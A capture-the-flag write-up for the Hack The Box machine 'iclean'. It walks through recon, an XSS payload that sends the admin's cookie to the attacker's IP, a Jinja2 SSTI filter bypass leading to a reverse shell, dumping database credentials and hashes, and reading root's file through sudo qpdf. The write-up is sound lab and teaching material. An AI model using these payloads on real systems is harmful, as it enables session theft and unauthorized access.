---
title: HTB - iclean
pin: true
author: Scott
date: 2024-08-3 11:27:22 +00:00
math: true
mermaid: true
icon: https://wolfcareers.com/wp-content/uploads/2023/01/1_cQGpZGkSuehv-YEXUweMQ-e1672674616339.webp
---


![alt text](/iclean/iclean.png)

## Overview:
iclean 


## Recon
---

### Nmap:

As always start with port scan and other services of iclean using nmap:
```python
local Linux/iclean » sudo nmap -sC -sV 10.10.11.12 -Pn -vv -oN nmap/iclean
Nmap scan report for 10.10.11.12 (10.10.11.12)
Host is up, received user-set (0.14s latency).
Scanned at 2024-08-03 17:31:08 +0545 for 26s
Not shown: 998 closed tcp ports (reset)
PORT   STATE SERVICE REASON         VERSION
22/tcp open  ssh     syn-ack ttl 63 OpenSSH 8.9p1 Ubuntu 3ubuntu0.6 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
|   256 2c:f9:07:77:e3:f1:3a:36:db:f2:3b:94:e3:b7:cf:b2 (ECDSA)
| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBG6uGZlOYFnD/75LXrnuHZ8mODxTWsOQia+qoPaxInXoUxVV4+56Dyk1WaY2apshU+pICxXMqtFR7jb3NRNZGI4=
|   256 4a:91:9f:f2:74:c0:41:81:52:4d:f1:ff:2d:01:78:6b (ED25519)
|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIJBnDPOYK91Zbdj8B2Q1MzqTtsc6azBJ+9CMI2E//Yyu
80/tcp open  http    syn-ack ttl 63 Apache httpd 2.4.52 ((Ubuntu))
|_http-title: Site doesn't have a title (text/html).
| http-methods:
|_  Supported Methods: HEAD GET POST OPTIONS
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```      
The nmap result listed out the different ports i.e 22 and 80.

Lets see the website. 
![alt text](/iclean/1.png)

Add to the host file /etc/hosts.
```python
10.10.11.12    capiclean.htb      
```

Fuzz the directories using dirsearch.
![alt text](/iclean/8.png)

Directories were found but the dashboard one with the status 302 may has admin dashboard.

***Steal Admin cookie? - Big Hint***

---

### HTTP 80
![alt text](/iclean/2.png)

While navigating the website, there is a login page that requires authentication, which may not be worth pursuing.

--- 

**XSS steal admin cookie:**

Click on "Get a Quote" button.
![alt text](/iclean/3.png)


Intercepting the request through the burpsuite.
![alt text](/iclean/4.png)


Send the burpsuite request to the repeater. I found an input field "service" where we can add payloads. Try a xss payload that steals cookie of the admin on the service parameter and open a python server so that it hits our server with the cookie.. 
```javascript
"><img src=x onerror=document.location="http://10.10.16.37/?c="+document.cookie; />
```

Click on "Send" button.
![alt text](/iclean/5.png)

When we check the python server, we can see that the page made a request to our server and we got a admin cookie.
![alt text](/iclean/6.png)


Add the stolen cookie to the browser's storage via the inspector, where we can manually add cookies.

![alt text](/iclean/7.png)

Reload the page and try to access the `/dashboard`.
![alt text](/iclean/9.png)
We can accessed the admin page.

### SSTI 

Lets generate invoice.
![alt text](/iclean/10.png)

We get a invoice id `9586239060`. Generate QR with invoice id `9586239060`.

![alt text](/iclean/11.png)

We add `a` in the qr_link and send it to the burpsuite.
![alt text](/iclean/12.png)
Intercept the request in Burp Suite. Change "hello" in the qr_link parameter, it reflected bact to the server and include an image at the bottom, with the source being the raw base64-encoded image.

![alt text](/iclean/13.png)

Which is like an SSTI injection.

Lets try ssti payload. When we send payload `{{7*7}}` in the qr_link paramter, it reflected back to me as result `49`.
![alt text](/iclean/14.png)


But when we try the ssti payload it fails. Looks like there is a filter. Found this interesting article.

**Article:** https://medium.com/@nyomanpradipta120/jinja2-ssti-filter-bypasses-a8d3eb7b000f.

Now after testing we find out that `_` is filtered so we bypass it using `\x5f`. We got RCE.
![alt text](/iclean/15.png)

We now add the reverse shell payload to the ssti payload.
![alt text](/iclean/16.png)

We got the shell for `iclean`.
![alt text](/iclean/17.png)

Check the python file `/opt/app/app.py` that runs the web application:
```python
from flask import Flask, render_template, request, jsonify, make_response, session, redirect, url_for
from flask import render_template_string
import pymysql
import hashlib
import os
import random, string
import pyqrcode
from jinja2 import StrictUndefined
from io import BytesIO
import re, requests, base64

app = Flask(__name__)

app.config['SESSION_COOKIE_HTTPONLY'] = False

secret_key = ''.join(random.choice(string.ascii_lowercase) for i in range(64))
app.secret_key = secret_key
# Database Configuration
db_config = {http://localhost:1313/
    'host': '127.0.0.1',
    'user': 'iclean',
    'password': 'pxCsmnGLckUb',
    'database': 'capiclean'
}
```

This app.py contains the database configuration that has user, password and database name.

Using mysql 
```mysql
www-data@iclean:/opt/app$ mysql -u iclean -ppxCsmnGLckUb -D capiclean

```
![alt text](/iclean/18.png)

We see that there are 3 databases.
```mysql
mysql> show databases;
+--------------------+
| Database           |
+--------------------+
| capiclean          |
| information_schema |
| performance_schema |
+--------------------+
```

We choose capiclean as it looks like the one a user created.
```mysql
use capiclean
```

When we check the tables, users table looks like the most interersting one.
```mysql
mysql> show tables;
+---------------------+
| Tables_in_capiclean |
+---------------------+
| quote_requests      |
| services            |
| users               |
+---------------------+
```

We see that there are two password. But when we look at it, it looks like it is stored in hash
```mysql
mysql> select * from users;
+----+----------+------------------------------------------------------------------+----------------------------------+
| id | username | password                                                         | role_id                          |
+----+----------+------------------------------------------------------------------+----------------------------------+
|  1 | admin    | 2ae316f10d49222f369139ce899e414e57ed9e339bb75457446f2ba8628a6e51 | 21232f297a57a5a743894a0e4a801fc3 |
|  2 | consuela |    | ee11cbb19052e40b07aac0ca060c23ee |
+----+----------+------------------------------------------------------------------+----------------------------------+
```
We crack the hash and now we got the password.
![alt text](/iclean/26.png)

---

### SSH login

Login with user `consuela` and password `simple and clean` using SSH.



Grab the User.txt
```c++
consuela@iclean:~$ cat user.txt
d8060c8c32d2cf98acde1e784b20eaa3
```

### Privilege Escalation

Lets see if the user has any sudo permissions.
![alt text](/iclean/19.png)

The user has permissions to run sudo without the use of password. We can see that the user can run `/usr/bin/qpdf` with sudo without any password.

It seems a Linux ELF executable.
![alt text](/iclean/20.png)

There is option for help 
![alt text](/iclean/21.png)

In the documentation says that we can `/usr/bin/qdf` use as infile, options, and outfile may be in any order as long as infile precedes outfile. 

**Note**: PDF file can be also empty `--empty`

So create a empty file.
![alt text](/iclean/22.png)
So it can be useful but we need more options to get root flag `root.txt`.

**Full Documentation:** 
https://qpdf.readthedocs.io/en/stable/cli.html .

![alt text](/iclean/23.png)
It says we can  use`--add-attachment` options, which are used to add attachments to a file.

Create a new, empty PDF file named `root` and adds the file `/root/root.txt` as an attachment to the PDF. This means that the file will be embedded within the PDF as an attachments.

![alt text](/iclean/24.png)
We got missing argument error (- -). 

Again create new PDF file named root with `/root/root.txt` as an attachment with (- -).
```c++
consuela@iclean:~$ sudo /usr/bin/qpdf --empty --add-attachment /root/root.txt -- root
```
With it no error. We can able to see the file that we named.
![alt text](/iclean/25.png)

Got `root flag`.

***The END !***
